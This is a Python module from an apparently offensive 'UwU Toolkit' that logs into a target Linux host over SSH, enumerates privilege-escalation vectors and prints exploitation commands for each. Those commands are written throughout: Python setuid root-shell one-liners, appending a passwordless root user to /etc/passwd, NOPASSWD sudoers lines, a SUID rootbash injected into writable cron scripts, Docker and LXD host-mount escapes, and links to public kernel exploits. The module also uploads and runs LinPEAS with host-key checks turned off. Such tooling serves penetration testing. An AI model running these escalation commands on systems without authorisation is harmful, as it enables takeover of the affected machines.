"""
Linux Privilege Escalation Suggester
Checks common Linux privesc vectors via remote commands:
1. SUID binaries (cross-referenced with GTFOBins)
2. Capabilities (dangerous caps like cap_setuid)
3. Writable /etc/passwd or /etc/shadow
4. Sudo misconfiguration (sudo -l)
5. Cron jobs (readable crontabs, writable scripts)
6. World-writable files in PATH
7. Kernel version check against known exploits
8. Docker/LXD group membership
9. Internal services listening on localhost

Executes checks remotely via SSH or session, categorizes by severity,
and provides exploitation commands for each finding.
"""

import os
import re
import shlex
import subprocess
from datetime import datetime
from typing import Dict, List, Optional, Tuple

from core.module_base import ModuleBase, ModuleType, Platform, find_tool


# GTFOBins SUID-exploitable binaries
GTFOBINS_SUID = {
    "aa-exec", "ab", "agetty", "alpine", "ar", "arj", "arp", "as", "ash",
    "aspell", "awk", "base32", "base64", "basenc", "bash", "bc", "bridge",
    "busctl", "busybox", "bzip2", "capsh", "cat", "chmod", "choom", "chown",
    "chroot", "clamscan", "cmp", "column", "comm", "cp", "cpio", "cpulimit",
    "csh", "csplit", "csvtool", "curl", "cut", "dash", "date", "dd", "debugfs",
    "dialog", "diff", "dig", "distcc", "dmsetup", "docker", "dosbox", "ed",
    "efax", "elvish", "emacs", "env", "eqn", "espeak", "expand", "expect",
    "file", "find", "fish", "flock", "fmt", "fold", "gawk", "gcore", "gdb",
    "genisoimage", "gimp", "git", "grep", "gtester", "gzip", "hd", "head",
    "hexdump", "highlight", "hping3", "iconv", "install", "ionice", "ip",
    "jjs", "join", "jq", "jrunscript", "julia", "ksh", "ksshell", "kubectl",
    "ld.so", "less", "logsave", "look", "lua", "make", "mawk", "more",
    "msgattrib", "msgcat", "msgconv", "msgfilter", "msgmerge", "msguniq",
    "multitime", "mv", "nasm", "nawk", "nc", "nft", "nice", "nl", "nm",
    "nmap", "node", "nohup", "ntpdate", "od", "openssl", "openvpn", "paste",
    "perf", "perl", "pg", "php", "pic", "pico", "pidstat", "pr", "ptx",
    "python", "python2", "python3", "rake", "readelf", "restic", "rev",
    "rlwrap", "rsync", "ruby", "run-parts", "rview", "rvim", "sash",
    "scanmem", "sed", "setarch", "shuf", "slsh", "socat", "sort", "split",
    "ssh-keygen", "ssh-keyscan", "sshpass", "start-stop-daemon", "stdbuf",
    "strace", "strings", "sysctl", "tac", "tail", "tar", "taskset", "tbl",
    "tclsh", "tee", "tftp", "tic", "timeout", "troff", "ul", "unexpand",
    "uniq", "unshare", "update-alternatives", "uudecode", "uuencode",
    "valgrind", "vi", "view", "vigr", "vim", "vimdiff", "vipw", "watch",
    "wc", "wget", "whiptail", "xargs", "xdotool", "xmodmap", "xmore",
    "xxd", "xz", "yash", "zsh", "zsoelim",
}

# Dangerous capabilities and their exploitation notes
DANGEROUS_CAPS = {
    "cap_setuid": ("CRITICAL", "Change UID to root", "binary -c 'import os;os.setuid(0);os.system(\"/bin/bash\")'"),
    "cap_setgid": ("HIGH", "Change GID to root group", "binary -c 'import os;os.setgid(0);os.system(\"/bin/bash\")'"),
    "cap_dac_override": ("CRITICAL", "Bypass file read/write/execute", "Read /etc/shadow, write /etc/passwd"),
    "cap_dac_read_search": ("HIGH", "Read any file", "Read /etc/shadow for hash cracking"),
    "cap_chown": ("HIGH", "Change file ownership", "chown root files, then write"),
    "cap_fowner": ("HIGH", "Bypass permission checks", "Modify any file regardless of owner"),
    "cap_sys_admin": ("CRITICAL", "Mount filesystems, trace processes", "Mount host filesystem in container escape"),
    "cap_sys_ptrace": ("HIGH", "Trace/inject into any process", "Inject shellcode into root process"),
    "cap_net_admin": ("MEDIUM", "Network admin operations", "ARP spoofing, route manipulation"),
    "cap_net_raw": ("MEDIUM", "Raw socket access", "Packet sniffing, spoofing"),
}

# Known vulnerable kernels (simplified patterns)
VULNERABLE_KERNELS = {
    "2.6": [
        ("CVE-2016-5195", "DirtyCow", "https://github.com/dirtycow/dirtycow.github.io"),
    ],
    "3.": [
        ("CVE-2016-5195", "DirtyCow", "https://github.com/dirtycow/dirtycow.github.io"),
        ("CVE-2015-1328", "OverlayFS", "https://www.exploit-db.com/exploits/37292"),
    ],
    "4.4": [
        ("CVE-2017-16995", "eBPF_verifier", "https://www.exploit-db.com/exploits/45010"),
    ],
    "4.8": [
        ("CVE-2017-1000112", "UFO Race Condition", "https://www.exploit-db.com/exploits/43418"),
    ],
    "4.15": [
        ("CVE-2021-3493", "OverlayFS PE", "https://github.com/briskets/CVE-2021-3493"),
    ],
    "5.8": [
        ("CVE-2022-0847", "DirtyPipe", "https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits"),
    ],
    "5.4": [
        ("CVE-2021-4034", "PwnKit (pkexec)", "https://github.com/ly4k/PwnKit"),
    ],
    "5.11": [
        ("CVE-2022-0847", "DirtyPipe", "https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits"),
    ],
    "5.13": [
        ("CVE-2022-0847", "DirtyPipe", "https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits"),
    ],
    "5.15": [
        ("CVE-2022-0847", "DirtyPipe", "https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits"),
    ],
    "5.16": [
        ("CVE-2022-0847", "DirtyPipe", "https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits"),
    ],
}


class PrivescSuggest(ModuleBase):
    """
    Linux Privilege Escalation Suggester.

    Remotely checks common privesc vectors on a target Linux system,
    categorizes findings by severity, and suggests exploitation commands.
    Supports command-by-command execution or linpeas upload.
    """

    def __init__(self):
        super().__init__()
        self.name = "privesc_suggest"
        self.description = "Linux privilege escalation suggester - check SUID, caps, sudo, cron, kernel, and more"
        self.author = "UwU Toolkit"
        self.version = "1.0.0"
        self.module_type = ModuleType.POST
        self.platform = Platform.LINUX
        self.tags = [
            "privesc", "linux", "enumeration", "suid", "capabilities",
            "sudo", "cron", "kernel", "docker", "post-exploitation",
            "suggester",
        ]
        self.references = [
            "https://gtfobins.github.io/",
            "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/",
            "https://github.com/carlospolop/PEASS-ng",
        ]

        # Connection options
        self.register_option("RHOSTS", "Target host IP", required=True)
        self.register_option("RPORT", "SSH port", default="22")
        self.register_option("USERNAME", "SSH username", required=True)
        self.register_option("PASSWORD", "SSH password", default="")
        self.register_option("SSH_KEY", "Path to SSH private key", default="")

        # Method options
        self.register_option("METHOD", "Check method",
                           default="command",
                           choices=["command", "script", "upload"])
        self.register_option("TOOL", "Tool for upload method",
                           default="auto",
                           choices=["linpeas", "auto"])

        # Session options
        self.register_option("SESSION", "Shell session ID or tmux name (for local use)", default="")

        # Output
        self.register_option("OUTPUT", "Save findings to file", default="")
        self.register_option("TIMEOUT", "Command timeout in seconds", default="300")

        # Internal state
        self._findings: List[Dict] = []

    def _build_ssh_cmd(self, remote_cmd: str) -> str:
        """Build SSH command string for remote execution."""
        host = self.get_option("RHOSTS")
        port = self.get_option("RPORT")
        user = self.get_option("USERNAME")
        password = self.get_option("PASSWORD")
        ssh_key = self.get_option("SSH_KEY")

        base_opts = (
            "-o StrictHostKeyChecking=no "
            "-o UserKnownHostsFile=/dev/null "
            "-o ConnectTimeout=10 "
            f"-p {port}"
        )

        # Escape the remote command for shell
        escaped_cmd = remote_cmd.replace("'", "'\\''")

        if ssh_key:
            return f"ssh -i {shlex.quote(ssh_key)} {base_opts} {user}@{host} '{escaped_cmd}'"
        elif password:
            return f"sshpass -p {shlex.quote(password)} ssh {base_opts} {user}@{host} '{escaped_cmd}'"
        else:
            return f"ssh {base_opts} {user}@{host} '{escaped_cmd}'"

    def _run_remote(self, cmd: str, timeout: int = 60) -> str:
        """Execute a command on the remote target and return output."""
        session = self.get_option("SESSION")

        if session:
            # Use session directly (already on the target)
            full_cmd = cmd
        else:
            # Use SSH
            full_cmd = self._build_ssh_cmd(cmd)

        ret, stdout, stderr = self.run_in_exegol(full_cmd, timeout=timeout)
        return (stdout + stderr).strip()

    def _add_finding(self, severity: str, category: str, title: str,
                     detail: str, exploit_cmd: str = "") -> None:
        """Add a finding to the results."""
        self._findings.append({
            "severity": severity,
            "category": category,
            "title": title,
            "detail": detail,
            "exploit_cmd": exploit_cmd,
        })

    def _check_system_info(self) -> None:
        """Check system information and current user context."""
        self.print_good("[1/9] System Information")
        self.print_line("-" * 40)

        kernel = self._run_remote("uname -r")
        self.print_status(f"  Kernel: {kernel}")

        distro = self._run_remote("cat /etc/*release 2>/dev/null | head -1")
        self.print_status(f"  Distro: {distro}")

        user_info = self._run_remote("id")
        self.print_status(f"  User: {user_info}")

        if "uid=0" in user_info:
            self.print_good("  Already running as root!")
            self._add_finding("INFO", "SYSTEM", "Already root", user_info)
            return

        hostname = self._run_remote("hostname")
        self.print_status(f"  Hostname: {hostname}")

        self.print_line()

    def _check_suid(self) -> None:
        """Check for exploitable SUID binaries."""
        self.print_good("[2/9] SUID Binaries")
        self.print_line("-" * 40)

        output = self._run_remote("find / -perm -4000 -type f 2>/dev/null", timeout=120)

        if not output:
            self.print_status("  No SUID binaries found (or insufficient permissions)")
            self.print_line()
            return

        suid_bins = [b.strip() for b in output.split("\n") if b.strip()]
        exploitable = []

        for binary in suid_bins:
            name = os.path.basename(binary)
            if name in GTFOBINS_SUID:
                exploitable.append((binary, name))

        self.print_status(f"  Total SUID binaries: {len(suid_bins)}")

        if exploitable:
            self.print_warning(f"  GTFOBins-exploitable: {len(exploitable)}")
            for binary, name in exploitable:
                self.print_warning(f"    EXPLOITABLE: {binary}")
                exploit_url = f"https://gtfobins.github.io/gtfobins/{name}/#suid"
                self._add_finding(
                    "CRITICAL", "SUID",
                    f"GTFOBins SUID: {binary}",
                    f"{name} has SUID bit set and is listed on GTFOBins",
                    f"See: {exploit_url}"
                )
        else:
            self.print_status("  No GTFOBins-exploitable SUID binaries found")

        self.print_line()

    def _check_capabilities(self) -> None:
        """Check for dangerous file capabilities."""
        self.print_good("[3/9] File Capabilities")
        self.print_line("-" * 40)

        output = self._run_remote("getcap -r / 2>/dev/null")

        if not output:
            self.print_status("  No capabilities found")
            self.print_line()
            return

        for line in output.split("\n"):
            if not line.strip():
                continue

            self.print_status(f"  {line}")

            for cap, (severity, desc, exploit) in DANGEROUS_CAPS.items():
                if cap in line.lower():
                    binary = line.split()[0] if line.split() else "unknown"
                    self.print_warning(f"    DANGEROUS ({severity}): {desc}")
                    self._add_finding(
                        severity, "CAPABILITY",
                        f"{cap} on {binary}",
                        f"{desc}: {line}",
                        exploit.replace("binary", binary)
                    )

        self.print_line()

    def _check_writable_files(self) -> None:
        """Check for writable /etc/passwd, /etc/shadow, and sensitive files."""
        self.print_good("[4/9] Writable Sensitive Files")
        self.print_line("-" * 40)

        sensitive_files = [
            ("/etc/passwd", "CRITICAL", "Add root user: echo 'pwned:$(openssl passwd -1 pass):0:0::/root:/bin/bash' >> /etc/passwd"),
            ("/etc/shadow", "CRITICAL", "Modify root password hash directly"),
            ("/etc/sudoers", "CRITICAL", "Add: username ALL=(ALL) NOPASSWD: ALL"),
            ("/etc/crontab", "HIGH", "Add malicious cron entry as root"),
        ]

        for filepath, severity, exploit in sensitive_files:
            result = self._run_remote(f"test -w {filepath} 2>/dev/null && echo 'WRITABLE' || echo 'not writable'")
            if "WRITABLE" in result:
                self.print_warning(f"  WRITABLE: {filepath}")
                self._add_finding(
                    severity, "WRITABLE",
                    f"{filepath} is writable",
                    f"Current user can modify {filepath}",
                    exploit
                )
            else:
                self.print_status(f"  OK: {filepath}")

        self.print_line()

    def _check_sudo(self) -> None:
        """Check sudo permissions."""
        self.print_good("[5/9] Sudo Configuration")
        self.print_line("-" * 40)

        output = self._run_remote("sudo -l 2>/dev/null")

        if not output or "password is required" in output.lower():
            self.print_status("  Cannot check sudo (password required)")
            self.print_line()
            return

        for line in output.split("\n"):
            line = line.strip()
            if not line:
                continue

            if "NOPASSWD" in line:
                self.print_warning(f"  NOPASSWD: {line}")

                # Check for wildcard / ALL
                if "(ALL)" in line or "(root)" in line:
                    self._add_finding(
                        "CRITICAL", "SUDO",
                        f"NOPASSWD sudo: {line}",
                        "Can run commands as root without password",
                        "sudo <command>"
                    )

                # Check for GTFOBins
                for binary in GTFOBINS_SUID:
                    if binary in line:
                        self._add_finding(
                            "CRITICAL", "SUDO",
                            f"GTFOBins sudo NOPASSWD: {binary}",
                            f"Can sudo {binary} without password",
                            f"See: https://gtfobins.github.io/gtfobins/{binary}/#sudo"
                        )

            elif "ALL" in line and "NOPASSWD" not in line:
                self.print_status(f"  {line}")
            elif line and not line.startswith("Matching"):
                self.print_line(f"    {line}")

        self.print_line()

    def _check_cron(self) -> None:
        """Check for exploitable cron jobs."""
        self.print_good("[6/9] Cron Jobs")
        self.print_line("-" * 40)

        # System crontab
        crontab = self._run_remote("cat /etc/crontab 2>/dev/null")
        crond = self._run_remote("ls -la /etc/cron.d/ 2>/dev/null && cat /etc/cron.d/* 2>/dev/null")

        all_cron = crontab + "\n" + crond

        for line in all_cron.split("\n"):
            line = line.strip()
            if not line or line.startswith("#"):
                continue

            # Look for cron entries with scripts
            if "/" in line and any(c in line for c in ["*", "@"]):
                self.print_status(f"  {line[:80]}")

                # Try to find the script path and check if writable
                parts = line.split()
                for part in parts:
                    if part.startswith("/") and not part.startswith("/dev"):
                        writable = self._run_remote(f"test -w {part} 2>/dev/null && echo 'WRITABLE'")
                        if "WRITABLE" in writable:
                            self.print_warning(f"    WRITABLE cron script: {part}")
                            self._add_finding(
                                "HIGH", "CRON",
                                f"Writable cron script: {part}",
                                f"Cron entry: {line[:60]}",
                                f"echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> {part}"
                            )
                        break

        # Check for wildcard injection opportunities
        wildcard_check = self._run_remote(
            "grep -r '\\*' /etc/crontab /etc/cron.d/ 2>/dev/null | "
            "grep -E '(tar|rsync|zip|7z)' | grep -v '^#'"
        )
        if wildcard_check:
            for line in wildcard_check.split("\n"):
                if line.strip():
                    self.print_warning(f"  Potential wildcard injection: {line.strip()[:70]}")
                    self._add_finding(
                        "HIGH", "CRON",
                        "Wildcard injection in cron",
                        line.strip()[:80],
                        "Create checkpoint files in target directory for tar/rsync exploitation"
                    )

        self.print_line()

    def _check_path_writable(self) -> None:
        """Check for world-writable directories in PATH."""
        self.print_good("[7/9] PATH Hijacking")
        self.print_line("-" * 40)

        output = self._run_remote(
            "echo $PATH | tr ':' '\\n' | while read dir; do "
            "[ -d \"$dir\" ] && [ -w \"$dir\" ] && echo \"WRITABLE: $dir\"; "
            "done"
        )

        if output:
            for line in output.split("\n"):
                if "WRITABLE" in line:
                    path_dir = line.replace("WRITABLE:", "").strip()
                    self.print_warning(f"  {line.strip()}")
                    self._add_finding(
                        "HIGH", "PATH_HIJACK",
                        f"Writable PATH directory: {path_dir}",
                        "Can place malicious binaries to be executed by root",
                        f"Place trojan binary in {path_dir}"
                    )
        else:
            self.print_status("  No writable PATH directories found")

        self.print_line()

    def _check_kernel(self) -> None:
        """Check kernel version against known exploits."""
        self.print_good("[8/9] Kernel Exploits")
        self.print_line("-" * 40)

        kernel = self._run_remote("uname -r")
        self.print_status(f"  Kernel: {kernel}")

        if not kernel:
            self.print_status("  Could not determine kernel version")
            self.print_line()
            return

        # Always check PwnKit (affects most Linux with pkexec)
        pkexec_check = self._run_remote("which pkexec 2>/dev/null && pkexec --version 2>/dev/null")
        if pkexec_check:
            self.print_warning("  pkexec found - check for CVE-2021-4034 (PwnKit)")
            self._add_finding(
                "HIGH", "KERNEL",
                "PwnKit (CVE-2021-4034) - pkexec present",
                f"pkexec found: {pkexec_check.split(chr(10))[0]}",
                "https://github.com/ly4k/PwnKit - PwnKit exploit"
            )

        found_vulns = False
        for version_prefix, exploits in VULNERABLE_KERNELS.items():
            if kernel.startswith(version_prefix):
                for cve, name, url in exploits:
                    self.print_warning(f"  Potential: {cve} ({name})")
                    self._add_finding(
                        "HIGH", "KERNEL",
                        f"{cve} - {name}",
                        f"Kernel {kernel} may be vulnerable",
                        f"See: {url}"
                    )
                    found_vulns = True

        if not found_vulns:
            self.print_status("  No known kernel exploits matched (check manually)")

        self.print_line()

    def _check_containers_services(self) -> None:
        """Check Docker/LXD group and internal services."""
        self.print_good("[9/9] Containers & Internal Services")
        self.print_line("-" * 40)

        # Docker group
        groups = self._run_remote("id")
        if "docker" in groups:
            self.print_warning("  User is in docker group!")
            self._add_finding(
                "CRITICAL", "DOCKER",
                "User in docker group",
                "Can mount host filesystem via Docker",
                "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
            )

        if "lxd" in groups or "lxc" in groups:
            self.print_warning("  User is in lxd/lxc group!")
            self._add_finding(
                "CRITICAL", "LXD",
                "User in lxd/lxc group",
                "Can create privileged container with host filesystem",
                "lxc init ubuntu:18.04 privesc -c security.privileged=true; lxc config device add privesc host-root disk source=/ path=/mnt/root; lxc start privesc; lxc exec privesc /bin/sh"
            )

        # Docker socket
        socket_check = self._run_remote("test -w /var/run/docker.sock 2>/dev/null && echo 'WRITABLE'")
        if "WRITABLE" in socket_check:
            self.print_warning("  Docker socket is writable!")
            self._add_finding(
                "CRITICAL", "DOCKER",
                "Docker socket writable",
                "/var/run/docker.sock is writable by current user",
                "docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh"
            )

        # Internal services
        self.print_line()
        self.print_status("  Internal services on localhost:")
        services = self._run_remote("ss -tlnp 2>/dev/null | grep '127.0.0' || netstat -tlnp 2>/dev/null | grep '127.0.0'")
        if services:
            for line in services.split("\n"):
                line = line.strip()
                if line:
                    self.print_line(f"    {line[:80]}")

                    # Flag interesting internal services
                    for port, svc_name in [("3306", "MySQL"), ("5432", "PostgreSQL"),
                                           ("6379", "Redis"), ("27017", "MongoDB"),
                                           ("8080", "HTTP"), ("8443", "HTTPS"),
                                           ("9200", "Elasticsearch"), ("11211", "Memcached")]:
                        if f":{port}" in line:
                            self._add_finding(
                                "MEDIUM", "SERVICE",
                                f"Internal {svc_name} on localhost:{port}",
                                f"Service listening: {line.strip()[:60]}",
                                f"Access via port forwarding or local connection"
                            )
        else:
            self.print_status("    No internal-only services detected")

        self.print_line()

    def _run_linpeas(self) -> bool:
        """Upload and run linpeas for comprehensive enumeration."""
        self.print_status("Uploading and running LinPEAS...")

        host = self.get_option("RHOSTS")
        port = self.get_option("RPORT")
        user = self.get_option("USERNAME")
        password = self.get_option("PASSWORD")
        ssh_key = self.get_option("SSH_KEY")

        # Find linpeas
        linpeas_paths = [
            "/opt/resources/linux/linPEAS/linpeas.sh",
            "/opt/tools/linpeas.sh",
            "/usr/share/peass/linpeas/linpeas.sh",
        ]

        linpeas_path = None
        for path in linpeas_paths:
            ret, stdout, stderr = self.run_in_exegol(f"test -f {path} && echo 'found'", timeout=5)
            if "found" in stdout:
                linpeas_path = path
                break

        if not linpeas_path:
            self.print_warning("LinPEAS not found locally, downloading...")
            ret, stdout, stderr = self.run_in_exegol(
                "wget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -O /tmp/linpeas.sh",
                timeout=60
            )
            if ret == 0:
                linpeas_path = "/tmp/linpeas.sh"
            else:
                self.print_error("Could not download linpeas")
                return False

        # Upload via SCP
        scp_opts = "-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null"
        if ssh_key:
            scp_cmd = f"scp -i {shlex.quote(ssh_key)} {scp_opts} -P {port} {linpeas_path} {user}@{host}:/tmp/linpeas.sh"
        elif password:
            scp_cmd = f"sshpass -p {shlex.quote(password)} scp {scp_opts} -P {port} {linpeas_path} {user}@{host}:/tmp/linpeas.sh"
        else:
            scp_cmd = f"scp {scp_opts} -P {port} {linpeas_path} {user}@{host}:/tmp/linpeas.sh"

        ret, stdout, stderr = self.run_in_exegol(scp_cmd, timeout=60)
        if ret != 0:
            self.print_error(f"Upload failed: {stderr}")
            return False

        # Make executable and run
        self._run_remote("chmod +x /tmp/linpeas.sh")
        self.print_status("Running linpeas (this may take several minutes)...")

        output = self._run_remote("/tmp/linpeas.sh -a 2>&1", timeout=600)

        if output:
            # Save raw output
            output_dir = os.path.dirname(self.get_option("OUTPUT")) if self.get_option("OUTPUT") else "/tmp"
            linpeas_file = os.path.join(output_dir, f"linpeas_{self.get_option('RHOSTS')}.txt")
            try:
                # Strip ANSI for saved file
                clean_output = re.sub(r'\x1b\[[0-9;]*m', '', output)
                with open(linpeas_file, "w") as f:
                    f.write(clean_output)
                self.print_good(f"LinPEAS output saved: {linpeas_file}")
            except Exception as e:
                self.print_warning(f"Could not save output: {e}")

            self.print_good("LinPEAS completed - check saved output for full results")

        # Cleanup
        self._run_remote("rm -f /tmp/linpeas.sh")

        return True

    def _print_summary(self) -> None:
        """Print categorized summary of all findings."""
        self.print_line()
        self.print_good("=" * 60)
        self.print_good("  PRIVILEGE ESCALATION SUMMARY")
        self.print_good("=" * 60)

        if not self._findings:
            self.print_warning("No significant findings")
            return

        # Group by severity
        critical = [f for f in self._findings if f["severity"] == "CRITICAL"]
        high = [f for f in self._findings if f["severity"] == "HIGH"]
        medium = [f for f in self._findings if f["severity"] == "MEDIUM"]

        self.print_line()
        self.print_status(f"  CRITICAL: {len(critical)}  |  HIGH: {len(high)}  |  MEDIUM: {len(medium)}")
        self.print_line()

        if critical:
            self.print_warning("CRITICAL - Likely paths to root:")
            self.print_line("-" * 60)
            for f in critical:
                self.print_warning(f"  [{f['category']}] {f['title']}")
                if f["detail"]:
                    self.print_line(f"    Detail: {f['detail'][:70]}")
                if f["exploit_cmd"]:
                    self.print_line(f"    Exploit: {f['exploit_cmd'][:70]}")
            self.print_line()

        if high:
            self.print_status("HIGH - Potential escalation vectors:")
            self.print_line("-" * 60)
            for f in high:
                self.print_status(f"  [{f['category']}] {f['title']}")
                if f["exploit_cmd"]:
                    self.print_line(f"    Exploit: {f['exploit_cmd'][:70]}")
            self.print_line()

        if medium:
            self.print_status("MEDIUM - Additional findings:")
            self.print_line("-" * 60)
            for f in medium:
                self.print_line(f"  [{f['category']}] {f['title']}")

    def _save_findings(self, output_file: str) -> None:
        """Save findings to file."""
        try:
            with open(output_file, "w") as f:
                f.write(f"Linux Privilege Escalation Findings\n")
                f.write(f"Target: {self.get_option('RHOSTS')}\n")
                f.write(f"Date: {datetime.now().isoformat()}\n")
                f.write("=" * 60 + "\n\n")

                for finding in self._findings:
                    f.write(f"[{finding['severity']}] [{finding['category']}] {finding['title']}\n")
                    if finding["detail"]:
                        f.write(f"  Detail: {finding['detail']}\n")
                    if finding["exploit_cmd"]:
                        f.write(f"  Exploit: {finding['exploit_cmd']}\n")
                    f.write("\n")

            self.print_good(f"Findings saved to: {output_file}")
        except Exception as e:
            self.print_error(f"Failed to save findings: {e}")

    def run(self) -> bool:
        method = self.get_option("METHOD")
        output_file = self.get_option("OUTPUT")

        self.print_line()
        self.print_good("=" * 60)
        self.print_good("  Linux Privilege Escalation Suggester")
        self.print_good("=" * 60)
        self.print_status(f"  Target: {self.get_option('RHOSTS')}")
        self.print_status(f"  User: {self.get_option('USERNAME')}")
        self.print_status(f"  Method: {method}")
        self.print_line()

        self._findings = []

        if method in ("upload", "script"):
            # Upload and run linpeas
            success = self._run_linpeas()
            if not success:
                self.print_warning("Falling back to command-by-command checks...")
                method = "command"

        if method == "command":
            # Run individual checks
            self._check_system_info()
            self._check_suid()
            self._check_capabilities()
            self._check_writable_files()
            self._check_sudo()
            self._check_cron()
            self._check_path_writable()
            self._check_kernel()
            self._check_containers_services()

        # Print summary
        self._print_summary()

        # Save findings if output specified
        if output_file:
            self._save_findings(output_file)

        return len(self._findings) > 0

    def check(self) -> bool:
        """Check SSH connectivity to target."""
        self.print_status("Testing SSH connection...")

        output = self._run_remote("echo 'UWU_SSH_OK'")
        if "UWU_SSH_OK" in output:
            self.print_good("SSH connection successful")
            return True

        self.print_error("SSH connection failed")
        return False


module = PrivescSuggest()
